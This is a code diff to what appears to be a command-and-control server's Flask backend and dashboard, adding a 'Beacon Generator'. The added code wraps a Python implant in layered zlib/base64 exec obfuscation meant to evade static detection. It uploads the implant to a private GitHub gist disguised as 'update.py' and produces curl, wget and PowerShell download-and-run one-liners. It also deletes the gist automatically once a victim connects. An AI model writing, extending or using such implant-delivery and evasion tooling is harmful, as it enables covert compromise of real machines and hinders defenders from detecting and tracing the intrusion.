@@ -118,6 +118,7 @@ results: dict[str, dict] = {}
 history: dict[str, list] = {}
 scan_store: dict[str, list] = {}
 event_log: list[dict] = []
+_pending_gists: dict[str, dict] = {}
 _name_counter = 0
 
 
@@ -730,6 +731,223 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         t.start()
         return jsonify({"status": "started", "target": target})
 
+    # ── Beacon generator (obfuscated one-liner) ──
+
+    @app.route("/api/server/beacon-gen", methods=["POST"])
+    @require_auth
+    def api_beacon_gen():
+        import zlib, random as _r, string, textwrap
+        body = request.get_json(silent=True) or {}
+        c2_url = body.get("c2_url", "").strip()
+        enc_key = body.get("enc_key", "").strip()
+        interval = int(body.get("interval", 300))
+        jitter = int(body.get("jitter", 20))
+        layers = max(1, min(int(body.get("layers", 3)), 6))
+        if not c2_url:
+            return jsonify({"error": "c2_url required"}), 400
+        if not enc_key:
+            enc_key = base64.b64encode(crypto._key).decode()
+
+        beacon_path = Path(__file__).parent / "beacon.py"
+        if not beacon_path.exists():
+            return jsonify({"error": "beacon.py not found"}), 500
+        src = beacon_path.read_text(encoding="utf-8")
+
+        config_block = textwrap.dedent(f"""\
+        if __name__=="__main__":
+            _cfg={{"c2":{{"beacon_interval_seconds":{interval},"jitter_percent":{jitter},
+            "https":{{"enabled":True,"callback_url":"{c2_url}","verify_ssl":False}},
+            "dns":{{"enabled":False,"domain":"","resolver":"8.8.8.8"}},
+            "encryption_key":"{enc_key}",
+            "proxy":{{"mode":"auto","url":""}}}}}}
+            b=Beacon(_cfg);b.start()
+            try:
+                import time
+                while True: time.sleep(60)
+            except KeyboardInterrupt: b.stop()
+        """)
+
+        payload = src + "\n" + config_block
+
+        def _rand_name(n=12):
+            return "_" + "".join(_r.choices(string.ascii_lowercase, k=n))
+
+        def _obfuscate_layer(code, layer_num):
+            compressed = zlib.compress(code.encode("utf-8"), 9)
+            encoded = base64.b64encode(compressed).decode()
+            var_data = _rand_name()
+            var_mod = _rand_name()
+            return f"import base64 as {var_mod},zlib;exec(zlib.decompress({var_mod}.b64decode('{encoded}')))"
+
+        deob_layers = [{"layer": 0, "label": "Original source", "size": len(payload),
+                        "preview": payload[:2000]}]
+        stage = payload
+        for i in range(layers):
+            stage = _obfuscate_layer(stage, i)
+            deob_layers.append({
+                "layer": i + 1,
+                "label": f"Layer {i + 1}: zlib + base64 + randomized alias",
+                "size": len(stage),
+                "preview": stage[:2000],
+            })
+
+        oneliner_unix = f"python3 -c '{stage}'"
+        oneliner_win = f'python -c "{stage}"'
+        _log_event("BEACON-GEN", f"Generated obfuscated beacon ({layers} layers) for {c2_url}")
+
+        return jsonify({
+            "oneliner_unix": oneliner_unix,
+            "oneliner_win": oneliner_win,
+            "layers": layers,
+            "c2_url": c2_url,
+            "size": len(stage),
+            "raw_size": len(payload),
+            "deob": list(reversed(deob_layers)),
+        })
+
+    # ── Beacon gist delivery ──
+
+    @app.route("/api/server/beacon-gist", methods=["POST"])
+    @require_auth
+    def api_beacon_gist():
+        import zlib, random as _r, string, textwrap
+
+        try:
+            check = subprocess.run(["gh", "auth", "status"], capture_output=True, text=True, timeout=10)
+            if check.returncode != 0:
+                return jsonify({"error": "gh CLI not authenticated. Run 'gh auth login' first."}), 400
+        except FileNotFoundError:
+            return jsonify({"error": "gh CLI not found. Install from https://cli.github.com"}), 400
+
+        body = request.get_json(silent=True) or {}
+        c2_url = body.get("c2_url", "").strip()
+        enc_key = body.get("enc_key", "").strip()
+        interval = int(body.get("interval", 300))
+        jitter = int(body.get("jitter", 20))
+        layers = max(1, min(int(body.get("layers", 3)), 6))
+        filename = body.get("filename", "update.py").strip() or "update.py"
+        if not c2_url:
+            return jsonify({"error": "c2_url required"}), 400
+        if not enc_key:
+            enc_key = base64.b64encode(crypto._key).decode()
+
+        beacon_path = Path(__file__).parent / "beacon.py"
+        if not beacon_path.exists():
+            return jsonify({"error": "beacon.py not found"}), 500
+        src = beacon_path.read_text(encoding="utf-8")
+
+        config_block = textwrap.dedent(f"""\
+        if __name__=="__main__":
+            _cfg={{"c2":{{"beacon_interval_seconds":{interval},"jitter_percent":{jitter},
+            "https":{{"enabled":True,"callback_url":"{c2_url}","verify_ssl":False}},
+            "dns":{{"enabled":False,"domain":"","resolver":"8.8.8.8"}},
+            "encryption_key":"{enc_key}",
+            "proxy":{{"mode":"auto","url":""}}}}}}
+            b=Beacon(_cfg);b.start()
+            try:
+                import time
+                while True: time.sleep(60)
+            except KeyboardInterrupt: b.stop()
+        """)
+
+        payload = src + "\n" + config_block
+
+        def _rand_name(n=12):
+            return "_" + "".join(_r.choices(string.ascii_lowercase, k=n))
+
+        def _obfuscate_layer(code):
+            compressed = zlib.compress(code.encode("utf-8"), 9)
+            encoded = base64.b64encode(compressed).decode()
+            var_mod = _rand_name()
+            return f"import base64 as {var_mod},zlib;exec(zlib.decompress({var_mod}.b64decode('{encoded}')))"
+
+        stage = payload
+        for _ in range(layers):
+            stage = _obfuscate_layer(stage)
+
+        import tempfile
+        tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False, encoding="utf-8")
+        tmp.write(stage)
+        tmp.close()
+
+        try:
+            r = subprocess.run(
+                ["gh", "gist", "create", "--public=false", "--filename", filename, tmp.name],
+                capture_output=True, text=True, timeout=30,
+            )
+        finally:
+            os.unlink(tmp.name)
+
+        if r.returncode != 0:
+            return jsonify({"error": f"gh gist create failed: {r.stderr.strip()}"}), 500
+
+        gist_url = r.stdout.strip()
+        gist_id = gist_url.rstrip("/").split("/")[-1]
+
+        raw_url = ""
+        try:
+            api_r = subprocess.run(
+                ["gh", "api", f"gists/{gist_id}", "--jq", f'.files["{filename}"].raw_url'],
+                capture_output=True, text=True, timeout=10,
+            )
+            if api_r.returncode == 0 and api_r.stdout.strip():
+                raw_url = api_r.stdout.strip()
+        except Exception:
+            pass
+        if not raw_url:
+            raw_url = f"{gist_url}/raw/{filename}"
+
+        _pending_gists[gist_id] = {
+            "url": gist_url,
+            "raw_url": raw_url,
+            "c2_url": c2_url,
+            "created": _now(),
+            "filename": filename,
+        }
+
+        oneliner_unix = f"curl -sL '{raw_url}'|python3"
+        oneliner_win = f'powershell -c "irm \'{raw_url}\'|python"'
+        oneliner_wget = f"wget -qO- '{raw_url}'|python3"
+
+        _log_event("BEACON-GIST", f"Created gist {gist_id} for {c2_url} (auto-delete on connect)")
+
+        return jsonify({
+            "gist_id": gist_id,
+            "gist_url": gist_url,
+            "raw_url": raw_url,
+            "filename": filename,
+            "oneliner_unix": oneliner_unix,
+            "oneliner_win": oneliner_win,
+            "oneliner_wget": oneliner_wget,
+            "layers": layers,
+            "size": len(stage),
+        })
+
+    @app.route("/api/server/beacon-gist/<gist_id>", methods=["DELETE"])
+    @require_auth
+    def api_beacon_gist_delete(gist_id):
+        try:
+            r = subprocess.run(
+                ["gh", "gist", "delete", gist_id, "--yes"],
+                capture_output=True, text=True, timeout=15,
+            )
+            _pending_gists.pop(gist_id, None)
+            if r.returncode != 0:
+                return jsonify({"error": r.stderr.strip()}), 500
+            _log_event("BEACON-GIST", f"Manually deleted gist {gist_id}")
+            return jsonify({"status": "deleted", "gist_id": gist_id})
+        except FileNotFoundError:
+            return jsonify({"error": "gh CLI not found"}), 400
+
+    @app.route("/api/server/beacon-gist/check", methods=["GET"])
+    @require_auth
+    def api_gist_check():
+        try:
+            r = subprocess.run(["gh", "auth", "status"], capture_output=True, text=True, timeout=10)
+            return jsonify({"available": r.returncode == 0, "detail": r.stderr.strip() or r.stdout.strip()})
+        except FileNotFoundError:
+            return jsonify({"available": False, "detail": "gh CLI not installed"})
+
     # ── Beacon catch-all (handles any POST path) ──
 
     @app.route("/", methods=["POST"])
@@ -783,6 +1001,7 @@ def _handle_register(payload: dict, crypto: ServerCrypto):
                 "_last_seen_ts": time.time(),
             })
             resp = crypto.wrap({"success": True, "agent_id": aid})
+            _cleanup_pending_gists()
             logger.info("Agent re-registered: %s (%s)", aid, payload.get("hostname"))
             _log_event("RECONNECT", f"{payload.get('user', '?')}@{payload.get('hostname', '?')} "
                        f"pid={payload.get('pid')} os={payload.get('os', '?')}",
@@ -817,7 +1036,31 @@ def _handle_register(payload: dict, crypto: ServerCrypto):
                agent_id=agent_id)
 
     resp = crypto.wrap({"success": True, "agent_id": agent_id})
+    _cleanup_pending_gists()
     return jsonify(resp)
+
+
+def _cleanup_pending_gists():
+    if not _pending_gists:
+        return
+    for gist_id in list(_pending_gists.keys()):
+        t = threading.Thread(target=_do_delete_gist, args=(gist_id,), daemon=True)
+        t.start()
+
+
+def _do_delete_gist(gist_id):
+    try:
+        r = subprocess.run(
+            ["gh", "gist", "delete", gist_id, "--yes"],
+            capture_output=True, text=True, timeout=15,
+        )
+        if r.returncode == 0:
+            _log_event("BEACON-GIST", f"Auto-deleted gist {gist_id} (agent connected)")
+        else:
+            _log_event("BEACON-GIST", f"Failed to auto-delete gist {gist_id}: {r.stderr.strip()}")
+    except Exception as e:
+        _log_event("BEACON-GIST", f"Auto-delete error for {gist_id}: {e}")
+    _pending_gists.pop(gist_id, None)
 
 
 def _handle_beacon(payload: dict, crypto: ServerCrypto):
@@ -1615,6 +1858,63 @@ header .info{font-size:11px;color:var(--text2)}
 /* Scrollbar */
 .agent-list::-webkit-scrollbar{width:4px}
 .agent-list::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:2px}
+
+/* Beacon Generator */
+.bgen-result{margin-top:12px;display:flex;flex-direction:column;gap:8px}
+.bgen-tab-bar{display:flex;gap:0;border-bottom:1px solid rgba(255,255,255,0.08)}
+.bgen-tab{
+  padding:6px 14px;font-size:11px;cursor:pointer;border:none;
+  background:none;color:var(--text2);border-bottom:2px solid transparent;
+}
+.bgen-tab.active{color:var(--red);border-bottom-color:var(--red)}
+.bgen-tab:hover{color:var(--text)}
+.bgen-code{
+  background:rgba(0,0,0,0.4);border:1px solid rgba(255,255,255,0.06);
+  border-radius:4px;padding:10px;font-family:monospace;font-size:11px;
+  color:var(--green);word-break:break-all;white-space:pre-wrap;
+  max-height:200px;overflow-y:auto;user-select:all;cursor:text;line-height:1.5;
+}
+.bgen-meta{display:flex;gap:16px;font-size:10px;color:var(--text2);padding:4px 0}
+.bgen-meta span{display:flex;align-items:center;gap:4px}
+.bgen-copy{
+  padding:6px 16px;background:rgba(255,26,26,0.12);border:1px solid var(--red-dim);
+  border-radius:4px;color:var(--red);cursor:pointer;font-size:11px;align-self:flex-end;
+}
+.bgen-copy:hover{background:rgba(255,26,26,0.2)}
+.bgen-layers{display:flex;align-items:center;gap:8px}
+.bgen-layers input[type=range]{flex:1;accent-color:var(--red)}
+.bgen-layers .bgen-lval{font-size:12px;color:var(--red);min-width:18px;text-align:center}
+.bgen-delivery{display:flex;gap:12px;padding:2px 0}
+.bgen-dlabel{
+  display:flex;align-items:center;gap:5px;font-size:11px;color:var(--text);
+  cursor:pointer;flex-direction:row !important;
+}
+.bgen-dlabel.disabled{color:var(--text2);cursor:not-allowed;opacity:0.5}
+.bgen-dlabel input{width:auto;accent-color:var(--red)}
+.bgen-deob-chain{display:flex;flex-direction:column;gap:0;overflow-y:auto;padding:4px 0}
+.bgen-deob-step{border:1px solid rgba(255,255,255,0.06);overflow:hidden}
+.bgen-deob-step:first-child{border-radius:4px 4px 0 0}
+.bgen-deob-step:last-child{border-radius:0 0 4px 4px}
+.bgen-deob-step+.bgen-deob-step{border-top:none}
+.bgen-deob-step.raw{border-color:rgba(68,221,170,0.25)}
+.bgen-deob-hdr{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:7px 10px;background:rgba(255,255,255,0.03);cursor:pointer;user-select:none;
+}
+.bgen-deob-hdr:hover{background:rgba(255,255,255,0.06)}
+.bgen-deob-badge{
+  font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:0.05em;
+  padding:2px 8px;border-radius:3px;background:rgba(255,26,26,0.12);color:var(--red);
+}
+.bgen-deob-step.raw .bgen-deob-badge{background:rgba(68,221,170,0.12);color:var(--green)}
+.bgen-deob-right{display:flex;align-items:center;gap:8px}
+.bgen-deob-size{font-size:10px;color:var(--text2)}
+.bgen-deob-chevron{font-size:10px;color:var(--text2);transition:transform .2s}
+.bgen-deob-step.open .bgen-deob-chevron{transform:rotate(90deg)}
+.bgen-deob-body{display:none;border-top:1px solid rgba(255,255,255,0.04)}
+.bgen-deob-step.open .bgen-deob-body{display:block}
+.bgen-deob-body .bgen-code{border:none;border-radius:0;max-height:350px}
+.bgen-deob-desc{font-size:10px;color:var(--text2);padding:6px 10px 0;letter-spacing:0.02em}
 </style>
 </head>
 <body>
@@ -1626,6 +1926,7 @@ header .info{font-size:11px;color:var(--text2)}
     <div class="spacer"></div>
     <span class="status-dot"></span>
     <span class="info" id="server-info">Listening</span>
+    <button class="topbar-ico-btn" onclick="showBeaconGen()" title="Beacon Generator">&#128640;</button>
     <button class="topbar-ico-btn" onclick="showLootViewer()" title="Loot">&#128142;</button>
     <button class="topbar-ico-btn" onclick="showServerLog()" title="Server Log">&#128220;</button>
     <div class="bell-wrap">
@@ -2527,6 +2828,228 @@ async function runResponder(){
   openPanel("Responder ("+mode+")", '<div class="t-pending">Responder running in '+esc(mode)+' mode on '+esc(iface)+'...<br><span style="font-size:10px;color:var(--text2)">Capturing hashes... Poll results below.</span></div>');
   if(panelPollTimer) clearInterval(panelPollTimer);
   panelPollTimer = setInterval(() => pollServerExec("responder"), 3000);
+}
+
+// ── Beacon Generator ──
+async function showBeaconGen(){
+  const cfg = await api("/api/server/config");
+  const gistCheck = await api("/api/server/beacon-gist/check");
+  const proto = cfg.ssl ? "https" : "http";
+  const defaultUrl = proto+"://"+location.hostname+":"+cfg.port+"/api/v1/beacon";
+  const ghOk = gistCheck.available;
+  const overlay = document.createElement("div");
+  overlay.className = "loot-overlay";
+  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
+  const panel = document.createElement("div");
+  panel.className = "loot-panel";
+  panel.style.minWidth = "480px";
+  panel.style.maxWidth = "600px";
+  panel.innerHTML = '<h2>\u{1F680} Beacon Generator</h2>'
+    +'<button class="loot-close" onclick="this.closest(\'.loot-overlay\').remove()">✕</button>'
+    +'<p style="font-size:11px;color:var(--text2);margin:0 0 12px">Generate an obfuscated Python beacon payload. Multiple compression and encoding layers make static detection harder.</p>'
+    +'<div class="avenum-form">'
+    +'<label>C2 Callback URL <input id="bg-url" value="'+esc(defaultUrl)+'" placeholder="https://c2.example.com:8443/api/v1/beacon"></label>'
+    +'<label>Encryption Key (base64) <input id="bg-key" value="'+esc(cfg.enc_key)+'" placeholder="auto-filled from server config"></label>'
+    +'<div style="display:flex;gap:8px">'
+    +'<label style="flex:1">Interval (sec) <input id="bg-interval" value="300" type="number" min="10" max="86400"></label>'
+    +'<label style="flex:1">Jitter (%) <input id="bg-jitter" value="20" type="number" min="0" max="90"></label>'
+    +'</div>'
+    +'<div class="bgen-layers">'
+    +'<span style="font-size:11px;color:var(--text2);white-space:nowrap">Obfuscation Layers</span>'
+    +'<input type="range" id="bg-layers" min="1" max="6" value="3" oninput="document.getElementById(\'bg-lval\').textContent=this.value">'
+    +'<span class="bgen-lval" id="bg-lval">3</span>'
+    +'</div>'
+    +'<div class="nxc-section" style="padding:8px 0 4px">Delivery Method</div>'
+    +'<div class="bgen-delivery">'
+    +'<label class="bgen-dlabel"><input type="radio" name="bg-delivery" value="inline" checked> <span>Inline one-liner</span></label>'
+    +'<label class="bgen-dlabel'+(ghOk?'':' disabled')+'"><input type="radio" name="bg-delivery" value="gist"'+(ghOk?'':' disabled')+'> <span>GitHub Gist'+(ghOk?' ✔':' (gh CLI not available)')+'</span></label>'
+    +'</div>'
+    +'<div id="bg-gist-opts" style="display:none">'
+    +'<label>Gist filename <input id="bg-gist-fn" value="update.py" placeholder="update.py"></label>'
+    +'<p style="font-size:10px;color:var(--text2);margin:2px 0 0">Creates a private gist. Auto-deletes when an agent connects.</p>'
+    +'</div>'
+    +'<button class="ave-run" onclick="runBeaconGen()">\u{1F680} Generate Payload</button>'
+    +'<div id="bg-result"></div>'
+    +'</div>';
+  overlay.appendChild(panel);
+  document.body.appendChild(overlay);
+  document.querySelectorAll('input[name="bg-delivery"]').forEach(r => {
+    r.addEventListener("change", () => {
+      document.getElementById("bg-gist-opts").style.display = r.value==="gist" && r.checked ? "block" : "none";
+    });
+  });
+}
+
+async function runBeaconGen(){
+  const url = document.getElementById("bg-url")?.value?.trim();
+  if(!url){ toast("warn","Beacon Gen","Enter the C2 callback URL",3000); return; }
+  const delivery = document.querySelector('input[name="bg-delivery"]:checked')?.value || "inline";
+  if(delivery==="gist") return runBeaconGist();
+  const key = document.getElementById("bg-key")?.value?.trim() || "";
+  const interval = document.getElementById("bg-interval")?.value || "300";
+  const jitter = document.getElementById("bg-jitter")?.value || "20";
+  const layers = document.getElementById("bg-layers")?.value || "3";
+  const btn = document.querySelector(".ave-run");
+  if(btn){ btn.disabled=true; btn.textContent="Generating..."; }
+  try{
+    const data = await api("/api/server/beacon-gen", {
+      method:"POST",
+      body:JSON.stringify({c2_url:url, enc_key:key, interval, jitter, layers})
+    });
+    if(data.error){ toast("err","Beacon Gen",data.error,4000); return; }
+    const container = document.getElementById("bg-result");
+    if(!container) return;
+    container.innerHTML =
+      '<div class="bgen-result">'
+      +'<div class="bgen-tab-bar">'
+      +'<button class="bgen-tab active" onclick="bgenTab(this,\'unix\')">Linux / macOS</button>'
+      +'<button class="bgen-tab" onclick="bgenTab(this,\'win\')">Windows</button>'
+      +'<button class="bgen-tab" onclick="bgenTab(this,\'deob\')">\u{1F50D} Deobfuscate</button>'
+      +'</div>'
+      +'<div class="bgen-code" id="bg-code">'+esc(data.oneliner_unix)+'</div>'
+      +'<div id="bg-deob" style="display:none"></div>'
+      +'<div class="bgen-meta" id="bg-meta">'
+      +'<span>\u{1F510} '+data.layers+' obfuscation layers</span>'
+      +'<span>\u{1F4E6} '+Math.round(data.size/1024)+' KB payload</span>'
+      +'<span>\u{1F4C4} '+Math.round(data.raw_size/1024)+' KB source</span>'
+      +'</div>'
+      +'<button class="bgen-copy" onclick="bgenCopy()">\u{1F4CB} Copy to Clipboard</button>'
+      +'</div>';
+    container._unix = data.oneliner_unix;
+    container._win = data.oneliner_win;
+    container._deob = data.deob;
+    toast("ok","Beacon Gen","Payload generated ("+data.layers+" layers)",3000);
+  }catch(e){
+    toast("err","Beacon Gen","Generation failed: "+e.message,4000);
+  }finally{
+    if(btn){ btn.disabled=false; btn.textContent="\u{1F680} Generate Payload"; }
+  }
+}
+
+async function runBeaconGist(){
+  const url = document.getElementById("bg-url")?.value?.trim();
+  const key = document.getElementById("bg-key")?.value?.trim() || "";
+  const interval = document.getElementById("bg-interval")?.value || "300";
+  const jitter = document.getElementById("bg-jitter")?.value || "20";
+  const layers = document.getElementById("bg-layers")?.value || "3";
+  const filename = document.getElementById("bg-gist-fn")?.value?.trim() || "update.py";
+  const btn = document.querySelector(".ave-run");
+  if(btn){ btn.disabled=true; btn.textContent="Creating Gist..."; }
+  try{
+    const data = await api("/api/server/beacon-gist", {
+      method:"POST",
+      body:JSON.stringify({c2_url:url, enc_key:key, interval, jitter, layers, filename})
+    });
+    if(data.error){ toast("err","Beacon Gist",data.error,5000); return; }
+    const container = document.getElementById("bg-result");
+    if(!container) return;
+    container.innerHTML =
+      '<div class="bgen-result">'
+      +'<div class="bgen-tab-bar">'
+      +'<button class="bgen-tab active" onclick="bgenTab(this,\'unix\')">curl (Linux/macOS)</button>'
+      +'<button class="bgen-tab" onclick="bgenTab(this,\'wget\')">wget</button>'
+      +'<button class="bgen-tab" onclick="bgenTab(this,\'win\')">PowerShell</button>'
+      +'</div>'
+      +'<div class="bgen-code" id="bg-code">'+esc(data.oneliner_unix)+'</div>'
+      +'<div class="bgen-meta" id="bg-meta">'
+      +'<span>\u{1F510} '+data.layers+' layers</span>'
+      +'<span>\u{1F4E6} '+Math.round(data.size/1024)+' KB</span>'
+      +'<span style="color:var(--green)">\u{2702}️ auto-delete on connect</span>'
+      +'</div>'
+      +'<div style="display:flex;gap:6px;align-self:flex-end">'
+      +'<button class="bgen-copy" onclick="bgenCopy()">\u{1F4CB} Copy</button>'
+      +'<button class="bgen-copy" style="color:var(--orange);border-color:rgba(255,170,0,0.3)" onclick="bgenDeleteGist(\''+data.gist_id+'\')">\u{1F5D1}️ Delete Gist</button>'
+      +'</div>'
+      +'<div style="font-size:10px;color:var(--text2);padding:4px 0">Gist: <a href="'+esc(data.gist_url)+'" target="_blank" style="color:var(--blue)">'+esc(data.gist_id)+'</a> &middot; File: '+esc(data.filename)+'</div>'
+      +'</div>';
+    container._unix = data.oneliner_unix;
+    container._win = data.oneliner_win;
+    container._wget = data.oneliner_wget;
+    toast("ok","Beacon Gist","Private gist created. Will auto-delete when agent connects.",5000);
+  }catch(e){
+    toast("err","Beacon Gist","Failed: "+e.message,4000);
+  }finally{
+    if(btn){ btn.disabled=false; btn.textContent="\u{1F680} Generate Payload"; }
+  }
+}
+
+async function bgenDeleteGist(gistId){
+  if(!confirm("Delete gist "+gistId+"?")) return;
+  try{
+    const data = await api("/api/server/beacon-gist/"+gistId, {method:"DELETE"});
+    if(data.error){ toast("err","Gist",data.error,4000); return; }
+    toast("ok","Gist","Gist "+gistId+" deleted",3000);
+    const container = document.getElementById("bg-result");
+    if(container) container.innerHTML = '<div style="text-align:center;padding:16px;color:var(--text2);font-size:12px">Gist deleted.</div>';
+  }catch(e){
+    toast("err","Gist","Delete failed: "+e.message,4000);
+  }
+}
+
+function bgenTab(el, platform){
+  el.parentElement.querySelectorAll(".bgen-tab").forEach(t=>t.classList.remove("active"));
+  el.classList.add("active");
+  const container = document.getElementById("bg-result");
+  const code = document.getElementById("bg-code");
+  const deob = document.getElementById("bg-deob");
+  const meta = document.getElementById("bg-meta");
+  if(!container || !code) return;
+  if(platform==="deob" && deob){
+    code.style.display="none";
+    meta.style.display="none";
+    deob.style.display="block";
+    if(!deob.innerHTML){
+      const layers = container._deob || [];
+      let html = '<div class="bgen-deob-chain">';
+      layers.forEach((l,i) => {
+        const isRaw = l.layer === 0;
+        const isOpen = isRaw;
+        const desc = isRaw
+          ? 'Python beacon source with embedded C2 configuration'
+          : 'zlib.compress (level 9) + base64.b64encode + randomized import alias';
+        html += '<div class="bgen-deob-step'+(isRaw?' raw':'')+(isOpen?' open':'')+'" onclick="bgenAccordion(this)">'
+          +'<div class="bgen-deob-hdr">'
+          +'<span class="bgen-deob-badge">'+(isRaw?'Original':'Layer '+l.layer)+'</span>'
+          +'<div class="bgen-deob-right">'
+          +'<span class="bgen-deob-size">'+Math.round(l.size/1024)+' KB</span>'
+          +'<span class="bgen-deob-chevron">&#9654;</span>'
+          +'</div></div>'
+          +'<div class="bgen-deob-body">'
+          +'<div class="bgen-deob-desc">'+desc+'</div>'
+          +'<div class="bgen-code" style="color:'+(isRaw?'var(--green)':'var(--text)')+'">'+esc(l.preview)+(l.size>2000?'\n\n[... truncated ...]':'')+'</div>'
+          +'</div></div>';
+      });
+      html += '</div>';
+      deob.innerHTML = html;
+    }
+  }else{
+    code.style.display="block";
+    if(meta) meta.style.display="flex";
+    if(deob) deob.style.display="none";
+    code.textContent = platform==="win" ? container._win : platform==="wget" ? (container._wget||container._unix) : container._unix;
+  }
+}
+
+async function bgenCopy(){
+  const code = document.getElementById("bg-code");
+  if(!code) return;
+  try{
+    await navigator.clipboard.writeText(code.textContent);
+    toast("ok","Beacon Gen","Copied to clipboard",2000);
+  }catch(e){
+    const range = document.createRange();
+    range.selectNodeContents(code);
+    const sel = window.getSelection();
+    sel.removeAllRanges(); sel.addRange(range);
+    document.execCommand("copy");
+    toast("ok","Beacon Gen","Copied to clipboard",2000);
+  }
+}
+
+function bgenAccordion(el){
+  const wasOpen = el.classList.contains("open");
+  el.parentElement.querySelectorAll(".bgen-deob-step").forEach(s => s.classList.remove("open"));
+  if(!wasOpen) el.classList.add("open");
 }
 
 // ── Netstat view ──
